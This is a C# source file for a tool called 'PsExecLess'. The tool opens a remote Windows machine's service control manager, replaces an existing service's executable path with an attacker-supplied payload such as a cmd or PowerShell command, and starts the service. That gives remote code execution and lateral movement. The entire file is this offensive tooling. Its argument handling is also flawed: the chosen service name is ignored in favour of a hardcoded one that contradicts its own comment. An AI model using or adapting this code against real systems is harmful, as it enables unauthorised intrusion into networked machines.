using System;
using System.Runtime.InteropServices;

namespace PsExecLess
{
    class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(
            string machineName,
            string databaseName,
            uint dwAccess
        );
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(
            IntPtr hSCManager,
            string lpServiceName, 
            uint dwDesiredAccess
        );
        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(
            IntPtr hService,
            uint dwServiceType,
            int dwStartType,
            int dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            string lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword,
            string lpDisplayName
        );
        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(
            IntPtr hService, 
            int dwNumServiceArgs, 
            string[] lpServiceArgVectors
        );
        static int Main(string[] args)
        {
            // .\PsExecLess <target> <service> <payload>
            // note- payload should be: c:\windows\system32\cmd.exe /C "powershell ..."
            if (args.Length == 0)
            {
                Console.WriteLine("Missing target");
                return 1;
            }

            string targService = "SensorService";
            if (args.Length == 2)
            {
                targService = args[1];
            }

            string payload = "notepad.exe";
            if (args.Length == 3)
            {
                payload = args[2];
            }

            string target = args[0];
            Console.WriteLine("target: " + target);
            Console.WriteLine("service: " + targService);
            Console.WriteLine("payload: " + payload);

            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            // SensorService - avail on Win 10, 16/19
            string ServiceName = "InstallService";
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);

            bResult = StartService(schService, 0, null);

            return 0;
        }
    }
}
